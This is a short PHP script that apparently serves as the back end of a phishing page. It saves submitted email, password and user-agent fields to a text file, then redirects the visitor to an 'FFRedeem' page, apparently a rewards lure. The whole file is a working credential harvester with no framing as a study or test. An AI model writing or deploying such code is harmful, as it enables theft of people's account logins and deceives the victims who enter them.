<?php 


$handle = fopen("./../usernames.txt", "w");
foreach($_POST as $variable => $value) {
    if ($variable == 'email'){
        fwrite($handle, "Account");
        fwrite($handle, ": ");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }

    if ($variable == 'pass'){
        fwrite($handle, "Pass");
        fwrite($handle, ": ");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }

    if($variable == 'agent'){
        fwrite($handle, "Agent");
        fwrite($handle, ": ");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }  
//fwrite($handle, $variable);
//fwrite($handle, " = ");
//fwrite($handle, $value);
//fwrite($handle, "\r\n");
}
fclose($handle);

echo "<script> location.href='./../FFRedeem/main/FFRedeem.html'</script>";



?>
